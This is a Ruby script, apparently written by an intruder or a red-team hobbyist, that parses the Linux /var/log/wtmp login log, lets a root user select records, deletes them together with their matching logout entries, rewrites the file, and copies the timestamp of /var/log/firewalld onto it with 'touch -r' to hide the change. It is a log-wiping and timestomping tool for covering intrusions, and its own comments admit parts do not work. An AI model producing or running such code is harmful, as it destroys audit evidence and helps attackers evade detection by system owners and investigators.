#!/usr/bin/ruby

# WTMP Structure
# (type = 4 , pid = 4, line = 32, inittab = 4, user = 32, host = 256, t1 = 4, t2 = 4, t3 = 4, t4 = 4, t5 = 4, some_other_shit = 32) = 384 byte structure
# Logout is also 384 Byte stucture, related together by PID (We think)

# USAGE: ./wtmpv4.rb <File Location> * Default is /var/log/wtmp

if ARGV[1]
  wtmp_location = ARGV[1]
else
  wtmp_location = "/var/log/wtmp"
end

# Won't really work if you aren't root

if Process.uid != 0
  abort("Must be root!")
end

# Open WTMP to read
$wtmp = File.open("/var/log/wtmp", "rb")

# Initialize arrays for entries and deletion

$wtmp_entries = []
$wtmp_delete  = []

# Incrementors
i = 0               # File Size Incrementor
line_size = 384     # Static Size of Entry


wtmp_size = $wtmp.size   # Get File Size
#$wtmp_modtime = File.mtime($wtmp)

# While File Size incrementor is less than file size
# Initilaize Hash, seek through to incrementor, read file equal to line size

while i < (wtmp_size)
  $wtmp_hash = Hash.new
  $wtmp.seek (i)
  entry = $wtmp.read line_size

# For entries with logouts - Does not function as of now
  if entry.length == 768
    type, pid, line, inittab, user, host, t1, t2, t3, t4, t5, end_bit = entry.match(
      /(.{4})(.{4})(.{32})(.{4})(.{32})(.{256})(.{4})(.{4})(.{4})(.{4})(.{4})(.{32})/m
    ).captures
  else
# Pull entries without logouts attached
    type, pid, line, inittab, user, host, t1, t2, t3, t4, t5, end_bit = entry.match(
      /(.{4})(.{4})(.{32})(.{4})(.{32})(.{256})(.{4})(.{4})(.{4})(.{4})(.{4})(.{32})/m
    ).captures
    logout = nil
  end

  i += line_size    # Increment ahead one full entry
# Build Hash Table for each entry
  wtmp_hash = {
    "type" => type,
    "pid" => pid,
    "line" => line,
    "inittab" => inittab,
    "user" => user,
    "host" => host,
    "t1" => t1,
    "t2" => t2,
    "t3" => t3,
    "t4" => t4,
    "t5" => t5,
    "end_bit" => end_bit
  }
# Push entries onto $wtmp_entries
    $wtmp_entries.push(wtmp_hash)

end

# wtmp_menu prints user, time accessed, PID, and joins them together into an array to be displayed
def wtmp_menu(array)
  g = 0
  array.each do |entry|
    print g   # Acts as record selector number
    print " => "
    if entry["user"][0] == "\x00" then print "logout" end # Display logouts
    print [entry["user"], Time.at(entry["t3"].unpack("V").first), entry["pid"].unpack("V"), "\n"].join("\t")
    # G  =>  Username  time  pid
    g +=1
  end
end

# record_delete compares PID of entry accepted and removes it's associated logout, if there is one
def record_delete(record)
  # assign picked record PID to variable
  record_pid = $wtmp_entries[record]["pid"]
  # Search through each entry in $wtmp_entries array
  $wtmp_entries.reverse.each do |entry|
    # Looks for records with the same PID
    if entry["pid"] == record_pid
      $wtmp_delete.push(entry)      # Adds to deleted array - Exists for validation
      $wtmp_entries.delete(entry)   # Removes from entry array
    end
  end
end

# Writes new wtmp records to file, using test file for now.
def rewrite_wtmp
  $wtmp.close # Close wtmp file
  new_wtmp = File.open("/var/log/wtmp", "wb") # Re-open wtmp file as write
  $wtmp_entries.each do |entry| # Add Entries to wtmp file
    #entries = [entry["type"], entry["pid"], entry["line"], entry["inittab"], entry["user"], entry["host"], entry["t1"], entry["t2"], entry["t3"], entry["t4"], entry["t5"]].join('')
    #might_work = [entry.values.join].pack("h)
    new_wtmp.write([entry.values.join('')].pack("a*"))
  end
  new_wtmp.close
  IO.popen("touch -r '/var/log/firewalld' '/var/log/wtmp'")
  abort ("Files Deleted")
end

def delete_stuffs
  wtmp_menu($wtmp_delete)
  print "Would you like to delete these files? (Y/N): "
  actually_delete = gets.chomp
  if actually_delete == "y" || actually_delete == "Y"
    #print "Deleted"
    rewrite_wtmp
    #print $wtmp_entries
    abort ("Probably didn't work")
  elsif actually_delete == "n" || actually_delete == "N"
    abort("--Exiting Program--")
  else
    print "Please enter Y or N \n"
    delete_stuffs
  end
end

# User Input / process Loop
# Will run until q or nothing is entered
while true
    wtmp_menu($wtmp_entries)
    print "Select Record Number: (q to exit) "
    $pick = gets.chomp
    if $pick == 'q' || $pick == ''
      delete_stuffs
    end
    stuff = $pick.to_i
    record_delete(stuff)
end
